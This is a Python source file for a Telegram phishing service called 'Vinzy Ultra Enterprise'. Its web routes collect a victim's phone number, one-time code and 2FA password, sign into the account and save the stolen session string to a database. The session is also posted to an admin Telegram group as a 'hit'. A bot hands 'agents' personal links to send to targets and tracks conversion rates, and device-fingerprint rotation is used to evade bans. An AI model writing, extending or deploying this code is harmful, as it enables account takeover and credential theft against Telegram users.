"""
VINZY ULTRA ENTERPRISE - VERSION 3.5.0
Optimized for 2026 MTProto Protocols
Fully Asynchronous / PostgreSQL Backed
Project: Vinzy Store Digital Services
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- 1. GLOBAL CONFIGURATION ---
# These should be set in your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# 2026 Device Fingerprinting Pool for Anti-Ban
DEVICE_POOL = [
    {"model": "iPhone 16 Pro Max", "sys": "iOS 18.3.1", "app": "11.5.0"},
    {"model": "iPhone 15 Pro", "sys": "iOS 17.6.2", "app": "11.4.2"},
    {"model": "Samsung Galaxy S24 Ultra", "sys": "Android 14", "app": "11.4.1"},
    {"model": "Google Pixel 9 Pro", "sys": "Android 15", "app": "11.5.0"},
    {"model": "Xiaomi 14 Ultra", "sys": "Android 14", "app": "11.3.0"},
    {"model": "iPad Pro M4", "sys": "iPadOS 17.5", "app": "11.4.0"},
    {"model": "OnePlus 12", "sys": "Android 14", "app": "11.2.0"},
    {"model": "Samsung Fold 6", "sys": "Android 14", "app": "11.5.1"},
    {"model": "Sony Xperia 1 VI", "sys": "Android 14", "app": "11.1.0"},
    {"model": "Asus ROG Phone 8", "sys": "Android 14", "app": "11.4.5"}
]

# Logging Engine Setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s [%(name)s.%(funcName)s:%(lineno)d] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Ultra_Core")

# Initialize Apps
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="*")

# In-Memory Session Storage
# Format: { phone: { "client": client, "tid": tid, "timestamp": time } }
active_mirrors = {}

# --- 2. DATABASE LAYER ---

def get_db():
    """Establishes connection to the PostgreSQL cluster with SSL."""
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def sync_database():
    """Ensures all tables exist and are optimized for 2026 volume."""
    logger.info("DATABASE: Initiating structural sync...")
    try:
        conn = get_db()
        cur = conn.cursor()
        
        # Captured Accounts Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                username TEXT,
                tid BIGINT,
                device_used TEXT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Link Performance Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # System Logs Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS system_audit (
                id SERIAL PRIMARY KEY,
                event_type TEXT,
                details TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("DATABASE: Tables verified and ready.")
    except Exception as e:
        logger.error(f"DATABASE FATAL: {str(e)}")

# Run DB sync on startup
sync_database()

# --- 3. HELPER UTILITIES ---

def clean_phone(p):
    """Normalizes phone number to digits only for MTProto compatibility."""
    return re.sub(r'\D', '', str(p))

async def cleanup_sessions():
    """Background task to remove dead sessions and free memory."""
    while True:
        try:
            now = time.time()
            expired = []
            for phone, data in active_mirrors.items():
                # Remove sessions inactive for more than 15 minutes
                if now - data['timestamp'] > 900:
                    expired.append(phone)
            
            for phone in expired:
                logger.info(f"CLEANUP: Disconnecting expired session for {phone}")
                try:
                    await active_mirrors[phone]['client'].disconnect()
                except Exception:
                    pass
                del active_mirrors[phone]
        except Exception as e:
            logger.error(f"CLEANUP_TASK_ERROR: {e}")
            
        await asyncio.sleep(60)

# --- 4. WEB SERVER ROUTES ---

@app.route('/')
async def serve_index():
    """Serves the main frontend login page."""
    return await send_from_directory('.', 'index.html')

@app.route('/step_phone', methods=['POST'])
async def handle_phone():
    """Initial handshake: Starts Telegram client and requests OTP."""
    try:
        payload = await request.json
        phone = clean_phone(payload.get('phone', ''))
        raw_tid = payload.get('tid', '0')
        tid = int(raw_tid) if str(raw_tid).isdigit() else 0

        if not phone or len(phone) < 8:
            return jsonify({"status": "error", "msg": "Invalid phone format."})

        # Device Emulation Strategy
        profile = random.choice(DEVICE_POOL)
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH, 
            device_model=profile['model'], 
            system_version=profile['sys'],
            app_version=profile['app']
        )
        
        await client.connect()

        # Update Analytics (Click Track)
        try:
            conn = get_db()
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
                last_activity = CURRENT_TIMESTAMP
            """, (tid,))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as db_err:
            logger.warning(f"METRICS_FAIL: {db_err}")

        # Request Code from Telegram
        await asyncio.sleep(random.uniform(1.0, 2.0))
        sent_code = await client.send_code_request(phone)
        
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "device": profile['model'],
            "timestamp": time.time()
        }
        
        logger.info(f"API: OTP requested for {phone} (Agent: {tid})")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"FloodWait: Try in {e.seconds}s."})
    except errors.PhoneNumberBannedError:
        return jsonify({"status": "error", "msg": "Phone is banned by Telegram."})
    except Exception as e:
        logger.error(f"PHONE_HANDSHAKE_FATAL: {e}")
        return jsonify({"status": "error", "msg": "Server busy. Try again."})

@app.route('/step_code', methods=['POST'])
async def handle_code():
    """Verifies OTP and handles login or 2FA transition."""
    try:
        payload = await request.json
        phone = clean_phone(payload.get('phone', ''))
        code = payload.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired."})

        mirror = active_mirrors[phone]
        client = mirror['client']
        mirror['timestamp'] = time.time()

        try:
            await asyncio.sleep(random.uniform(1.0, 2.5))
            await client.sign_in(phone, code, phone_code_hash=mirror['hash'])
            return await finalize_hit(phone)
        
        except errors.SessionPasswordNeededError:
            logger.info(f"API: 2FA required for {phone}")
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Invalid code."})
        except errors.PhoneCodeExpiredError:
            return jsonify({"status": "error", "msg": "Code expired."})
        except Exception as e:
            return jsonify({"status": "error", "msg": str(e)})

    except Exception as e:
        logger.error(f"CODE_VERIFY_FATAL: {e}")
        return jsonify({"status": "error", "msg": "Processing failure."})

@app.route('/step_2fa', methods=['POST'])
async def handle_2fa():
    """Final check for accounts with 2FA Passwords."""
    try:
        payload = await request.json
        phone = clean_phone(payload.get('phone', ''))
        password = payload.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired."})

        mirror = active_mirrors[phone]
        client = mirror['client']
        mirror['timestamp'] = time.time()

        try:
            await client.sign_in(password=password)
            return await finalize_hit(phone)
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Incorrect 2FA password."})
    except Exception as e:
        logger.error(f"2FA_VERIFY_FATAL: {e}")
        return jsonify({"status": "error", "msg": "Security protocol error."})

async def finalize_hit(phone):
    """Saves session, logs to group, and notifies the agent."""
    try:
        mirror = active_mirrors[phone]
        client = mirror['client']
        tid = mirror['tid']
        
        me = await client.get_me()
        session_str = client.session.save()
        
        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
        uname = f"@{me.username}" if me.username else "N/A"

        # 1. Update Persistent DB
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_used) 
            VALUES (%s, %s, %s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, name, uname, tid, mirror['device']))
        
        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # 2. Master Log to Admin Group
        log_card = (
            f"⚡️ <b>VINZY HIT DETECTED</b> ⚡️\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🏷 <b>User:</b> {uname}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"📱 <b>Device:</b> {mirror['device']}\n"
            f"🆔 <b>Agent:</b> <code>{tid}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, log_card)

        # 3. Notify the specific Agent
        if tid != 0:
            bot.send_message(tid, f"✅ <b>Login Secured!</b>\nTarget: {name}\nStats updated in your panel.")

        # 4. Cleanup Memory
        await client.disconnect()
        if phone in active_mirrors:
            del active_mirrors[phone]
        
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZE_FATAL: {e}")
        return jsonify({"status": "error", "msg": "Session capture failed."})

# --- 5. TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    """Initializes the agent interface."""
    welcome = (
        f"<b>Vinzy Ultra Enterprise v3.5</b>\n"
        f"System Status: 🟢 Online\n"
        f"Your ID: <code>{m.from_user.id}</code>\n"
        f"Role: <pre>Verified Agent</pre>"
    )
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 My Link", "📊 My Stats", "⚙️ Support", "💳 Pricing")
    bot.send_message(m.chat.id, welcome, reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def cmd_link(m):
    """Generates a personalized tracking link for the specific user."""
    # Updated to your specific Koyeb App URL
    base_url = "https://relieved-olly-vinzystorez-d76f3e98.koyeb.app/"
    track_link = f"{base_url}?id={m.from_user.id}"
    
    msg = (
        f"🚀 <b>Personalized Link Ready</b>\n\n"
        f"<code>{track_link}</code>\n\n"
        f"<b>Instructions:</b>\n"
        f"1. Copy the link above.\n"
        f"2. Send it to your target.\n"
        f"3. All hits will be logged to your ID: <code>{m.from_user.id}</code>"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def cmd_stats(m):
    """Retrieves real-time analytics from the DB."""
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        
        clicks = res[0] if res else 0
        hits = res[1] if res else 0
        ratio = round((hits/clicks)*100, 1) if clicks > 0 else 0
        
        stats_msg = (
            f"📊 <b>Performance Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🖱 <b>Link Clicks:</b> {clicks}\n"
            f"🎯 <b>Account Hits:</b> {hits}\n"
            f"📈 <b>Conversion:</b> {ratio}%\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(m.chat.id, stats_msg)
    except Exception:
        bot.send_message(m.chat.id, "❌ Database error. Please try again later.")

# --- 6. RUNTIME ENGINE ---

def run_bot_polling():
    """Starts the bot in a separate thread for concurrency."""
    logger.info("ENGINE: Starting Telegram Bot Interface...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"POLLING_RESTART: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # 1. Start Background Cleanup Task
    loop = asyncio.get_event_loop()
    loop.create_task(cleanup_sessions())
    
    # 2. Start Bot Polling Thread
    bot_thread = Thread(target=run_bot_polling, daemon=True)
    bot_thread.start()
    
    # 3. Launch Quart Server
    logger.info("ENGINE: Initializing Quart Web Server...")
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)

# --- END OF SYSTEM CORE ---
